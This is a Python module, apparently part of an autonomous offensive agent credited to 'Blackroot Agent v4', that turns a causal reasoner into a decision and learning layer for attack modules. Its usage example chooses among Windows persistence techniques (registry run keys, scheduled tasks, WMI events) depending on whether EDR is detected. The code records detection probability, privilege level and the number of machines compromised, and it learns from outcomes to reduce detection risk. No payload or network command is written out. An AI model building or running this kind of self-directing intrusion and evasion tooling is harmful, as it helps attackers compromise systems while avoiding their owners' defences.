"""
UNIFIED INTEGRATION: Adapter Layer for Operational Modules
===========================================================

Provides clean interfaces for operational modules to use:
- UnifiedCausalReasonerV2 for intelligent decision-making
- Transparent logging and learning
- Cross-phase state coordination

Usage:
    from unified_integration import OperationalIntegration
    
    # In persistence_hardening.py
    integration = OperationalIntegration("persistence_hardening")
    decision = integration.decide(
        phase=OperationalPhase.PERSISTENCE,
        options=["registry_run", "scheduled_task", "wmi_event"],
        context={"risk": 0.3, "edr_detected": False}
    )
    
    # Log outcome for learning
    integration.record_outcome(
        decision=decision,
        success=True,
        latency_ms=150
    )

Author: Blackroot Agent v4
Date: April 6, 2026
"""

import logging
from typing import Dict, List, Optional, Any
from dataclasses import dataclass

from world_state import OperationalPhase
from unified_causal_reasoner_v2 import UnifiedCausalReasonerV2, Decision

logger = logging.getLogger("UnifiedIntegration")


@dataclass
class IntegrationDecision:
    """Wrapper around unified Decision with module-specific metadata"""
    unified_decision: Decision
    module_name: str
    recommended_option: str
    alternatives: List[str]
    reasoning: str
    confidence: float
    timestamp: str
    
    def is_confident(self) -> bool:
        """Should we act on this recommendation?"""
        return self.unified_decision.is_confident()
    
    def should_explore(self) -> bool:
        """Should we try alternatives for learning?"""
        return self.uncertainty_level() > 0.6
    
    def uncertainty_level(self) -> float:
        """How uncertain is this decision?"""
        return self.unified_decision.uncertainty_level


class OperationalIntegration:
    """
    Integration layer for operational modules to use unified reasoning
    
    Handles:
    - Decision-making using unified causal reasoner
    - Context/world state updates
    - Outcome recording and learning
    - Cross-phase communication
    - Transparency logging
    """
    
    def __init__(self, module_name: str, shared_reasoner: Optional[UnifiedCausalReasonerV2] = None):
        """
        Initialize integration for an operational module
        
        Args:
            module_name: Name of calling module (e.g., "persistence_hardening")
            shared_reasoner: Shared reasoner instance (optional, creates new if not provided)
        """
        self.module_name = module_name
        self.reasoner = shared_reasoner or UnifiedCausalReasonerV2()
        self.decision_history: List[IntegrationDecision] = []
        self.last_decision: Optional[IntegrationDecision] = None
        
        logger.info(f"[UnifiedIntegration] Initialized for module: {module_name}")
    
    def decide(
        self,
        phase: OperationalPhase,
        options: List[str],
        context: Optional[Dict[str, Any]] = None,
        force_exploration: bool = False,
    ) -> IntegrationDecision:
        """
        Make intelligent decision for current operational context
        
        Args:
            phase: Current operational phase
            options: List of available options/techniques
            context: World state updates {risk, edr_detected, etc.}
            force_exploration: Force exploration over exploitation
        
        Returns:
            IntegrationDecision with recommendation and reasoning
        """
        
        # Update world state if context provided
        if context:
            self.reasoner.world.update_environment_knowledge(context)
        
        # Set current phase
        self.reasoner.world.current_phase = phase
        
        # Get unified decision
        unified_decision = self.reasoner.decide(
            phase=phase,
            options=options,
            additional_context=context
        )
        
        # Force exploration if requested (for learning)
        recommended = unified_decision.choice
        if force_exploration and len(unified_decision.alternatives) > 0:
            # Try a lower-scored option for exploration
            _, alternative = unified_decision.alternatives[0]
            recommended = alternative
            logger.info(f"[{self.module_name}] Forced exploration: {unified_decision.choice} → {recommended}")
        
        # Build integration decision
        alternatives = [opt for opt, _ in unified_decision.alternatives if opt != recommended]
        
        integration_decision = IntegrationDecision(
            unified_decision=unified_decision,
            module_name=self.module_name,
            recommended_option=recommended,
            alternatives=alternatives,
            reasoning=unified_decision.reasoning,
            confidence=unified_decision.confidence,
            timestamp=unified_decision.choice,  # Use decision metadata
        )
        
        # Record for history
        self.decision_history.append(integration_decision)
        self.last_decision = integration_decision
        
        logger.info(
            f"[{self.module_name}] Decision: {recommended} "
            f"(confidence={unified_decision.confidence:.0%}, "
            f"uncertainty={unified_decision.uncertainty_level:.0%})"
        )
        
        return integration_decision
    
    def record_outcome(
        self,
        decision: IntegrationDecision,
        success: bool,
        error: Optional[str] = None,
        metadata: Optional[Dict[str, Any]] = None,
    ):
        """
        Record outcome of decision execution for learning
        
        Args:
            decision: The IntegrationDecision that was executed
            success: Whether execution was successful
            error: Error message if failed
            metadata: Additional execution metadata
        """
        
        # Build outcome record
        outcome = {
            "success": success,
            "reason": error or ("Success" if success else "Execution failed"),
        }
        
        # Add metadata if provided
        if metadata:
            outcome.update(metadata)
        
        # Calculate risk delta
        if success:
            risk_delta = -0.05  # Success reduces risk
        else:
            risk_delta = +0.15  # Failure increases risk
        
        outcome["risk_delta"] = {"detection_probability": risk_delta}
        
        # Record with reasoner
        self.reasoner.execute_decision(decision.unified_decision, outcome)
        
        logger.info(
            f"[{self.module_name}] Outcome recorded: "
            f"{decision.recommended_option}={success}, "
            f"risk_delta={risk_delta:+.2f}"
        )
    
    def get_decision_context(self) -> Dict[str, Any]:
        """Get current operational context for coordination"""
        return {
            "phase": self.reasoner.world.current_phase.value,
            "risk": self.reasoner.world.risk.total_exposure(),
            "detection_probability": self.reasoner.world.risk.detection_probability,
            "uncertainty": self.reasoner.world.environment.uncertainty,
            "privilege_level": self.reasoner.world.resources.privilege_level,
            "machines_compromised": self.reasoner.world.resources.machine_count,
        }
    
    def get_decision_history(self, limit: int = 10) -> List[Dict[str, Any]]:
        """Get recent decision history"""
        return [
            {
                "module": d.module_name,
                "option": d.recommended_option,
                "confidence": f"{d.confidence:.0%}",
                "uncertainty": f"{d.unified_decision.uncertainty_level:.0%}",
                "reasoning": d.reasoning[:100] + "..." if len(d.reasoning) > 100 else d.reasoning,
            }
            for d in self.decision_history[-limit:]
        ]


# Global shared reasoner for cross-module coordination
_shared_reasoner: Optional[UnifiedCausalReasonerV2] = None


def get_shared_reasoner() -> UnifiedCausalReasonerV2:
    """Get or create shared reasoner instance for all modules"""
    global _shared_reasoner
    if _shared_reasoner is None:
        _shared_reasoner = UnifiedCausalReasonerV2()
        logger.info("[UnifiedIntegration] Created shared reasoner instance")
    return _shared_reasoner


def create_integration(module_name: str) -> OperationalIntegration:
    """
    Factory function to create integration with shared reasoner
    
    Usage:
        from unified_integration import create_integration
        integration = create_integration("persistence_hardening")
    """
    shared = get_shared_reasoner()
    return OperationalIntegration(module_name, shared_reasoner=shared)
